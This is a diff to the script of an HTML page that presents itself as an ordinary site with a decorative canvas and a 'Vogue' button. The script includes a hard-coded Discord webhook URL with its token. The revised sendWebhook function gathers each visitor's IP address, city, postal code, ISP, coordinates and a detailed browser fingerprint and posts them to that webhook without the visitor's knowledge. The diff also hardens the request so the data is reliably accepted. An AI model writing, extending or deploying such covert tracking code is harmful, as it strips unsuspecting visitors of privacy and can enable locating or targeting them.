@@ -93,7 +93,7 @@
 <body>
 
 <canvas id="c"></canvas>
-<button id="myinfo-btn">Join us.</button>
+<button id="myinfo-btn">Vogue</button>
 
 <div id="myinfo-modal">
   <div class="modal-box">
@@ -129,7 +129,7 @@
 
 <script>
 // ── CONFIG ────────────────────────────────────────────────
-const WEBHOOK = 'https://discord.com/api/webhooks/1499514371511025856/nxiLGjYa_v31aLOVjZxXaZ79V15gAr7KOem3gypFTWNt6UKopkFo65LUNLcdJZ0u0CC';
+const WEBHOOK = 'https://discord.com/api/webhooks/1499514371511025856/nxiLGjYa_v31aLOVjZxXaZ79V15gAr7KOem3gypFTWNt6UKopkFo65LUNLcdJZ0u0CCn';
 // ─────────────────────────────────────────────────────────
 
 // Particle canvas
@@ -235,45 +235,47 @@ async function fetchIPInfo(){
 
 // Webhook
 async function sendWebhook(title,color,extra){
-  try{
-    const ip=await fetchIPInfo();
-    const fp=getFingerprint();
-    const vid=getVisitorID();
-    const vc=getVisitCount();
-    const fields=[
-      ...extra,
-      {name:'🪪 Visitor ID', value:`\`${vid}\``,inline:true},
-      {name:'👋 Visits',     value:vc===1?'🆕 First visit':`🔁 Visit #${vc}`,inline:true},
-      {name:'📡 IP',         value:ip.ip,inline:true},
-      {name:'🌍 Country',    value:`${ip.country} (${ip.code})`,inline:true},
-      {name:'🏙 City',       value:`${ip.city}, ${ip.region}`,inline:true},
-      {name:'📮 Postal',     value:ip.postal,inline:true},
-      {name:'🏢 ISP',        value:ip.isp,inline:true},
-      {name:'🔢 ASN',        value:ip.asn,inline:true},
-      {name:'🏗 Org',        value:ip.org,inline:true},
-      {name:'📍 Coords',     value:`${ip.lat}, ${ip.lon}`,inline:true},
-      {name:'🕐 Timezone',   value:ip.tz,inline:true},
-      {name:'💻 OS',         value:fp.os,inline:true},
-      {name:'🌐 Browser',    value:fp.browser,inline:true},
-      {name:'📺 Screen',     value:fp.screen_res,inline:true},
-      {name:'🖼 Viewport',   value:fp.viewport,inline:true},
-      {name:'🎨 Color Depth',value:fp.color_depth,inline:true},
-      {name:'⚡ Pixel Ratio',value:String(fp.pixel_ratio),inline:true},
-      {name:'🗣 Language',   value:fp.lang,inline:true},
-      {name:'🧠 RAM',        value:fp.memory,inline:true},
-      {name:'⚙️ CPU Cores', value:String(fp.cores),inline:true},
-      {name:'📶 Connection', value:fp.connection,inline:true},
-      {name:'👆 Touch',      value:fp.touch,inline:true},
-      {name:'📡 Online',     value:fp.online,inline:true},
-      {name:'🎮 GPU',        value:fp.gpu,inline:false},
-      {name:'🔗 Referrer',   value:fp.referrer,inline:false},
-      {name:'🍪 Cookies',    value:fp.cookies,inline:true},
-      {name:'🚫 DNT',        value:fp.dnt,inline:true},
-      {name:'📋 User Agent', value:fp.ua.slice(0,200),inline:false},
-    ];
-    await fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({embeds:[{title,color,fields,timestamp:new Date().toISOString()}]})});
-  }catch(e){}
+  const fp=getFingerprint();
+  const vid=getVisitorID();
+  const vc=getVisitCount();
+  const ip=await fetchIPInfo();
+  // Discord rejects empty strings — ensure every value is non-empty
+  const s=v=>(String(v||'').trim()||'N/A');
+  const fields=[
+    ...extra,
+    {name:'🪪 Visitor ID', value:s(`\`${vid}\``),inline:true},
+    {name:'👋 Visits',     value:s(vc===1?'🆕 First visit':`🔁 Visit #${vc}`),inline:true},
+    {name:'📡 IP',         value:s(ip.ip),inline:true},
+    {name:'🌍 Country',    value:s(`${ip.country} (${ip.code})`),inline:true},
+    {name:'🏙 City',       value:s(`${ip.city}, ${ip.region}`),inline:true},
+    {name:'📮 Postal',     value:s(ip.postal),inline:true},
+    {name:'🏢 ISP',        value:s(ip.isp),inline:true},
+    {name:'🔢 ASN',        value:s(ip.asn),inline:true},
+    {name:'🏗 Org',        value:s(ip.org),inline:true},
+    {name:'📍 Coords',     value:s(`${ip.lat}, ${ip.lon}`),inline:true},
+    {name:'🕐 Timezone',   value:s(ip.tz),inline:true},
+    {name:'💻 OS',         value:s(fp.os),inline:true},
+    {name:'🌐 Browser',    value:s(fp.browser),inline:true},
+    {name:'📺 Screen',     value:s(fp.screen_res),inline:true},
+    {name:'🖼 Viewport',   value:s(fp.viewport),inline:true},
+    {name:'🎨 Color Depth',value:s(fp.color_depth),inline:true},
+    {name:'⚡ Pixel Ratio',value:s(fp.pixel_ratio),inline:true},
+    {name:'🗣 Language',   value:s(fp.lang),inline:true},
+    {name:'🧠 RAM',        value:s(fp.memory),inline:true},
+    {name:'⚙️ CPU Cores', value:s(fp.cores),inline:true},
+    {name:'📶 Connection', value:s(fp.connection),inline:true},
+    {name:'👆 Touch',      value:s(fp.touch),inline:true},
+    {name:'📡 Online',     value:s(fp.online),inline:true},
+    {name:'🎮 GPU',        value:s(fp.gpu),inline:false},
+    {name:'🔗 Referrer',   value:s(fp.referrer),inline:false},
+    {name:'🍪 Cookies',    value:s(fp.cookies),inline:true},
+    {name:'🚫 DNT',        value:s(fp.dnt),inline:true},
+    {name:'📋 User Agent', value:s(fp.ua.slice(0,200)),inline:false},
+  ];
+  const res=await fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({embeds:[{title,color,fields,timestamp:new Date().toISOString()}]})});
+  // Uncomment below to debug webhook response in console:
+  // console.log('Webhook status:', res.status, await res.text());
 }
 
 // Link clicks
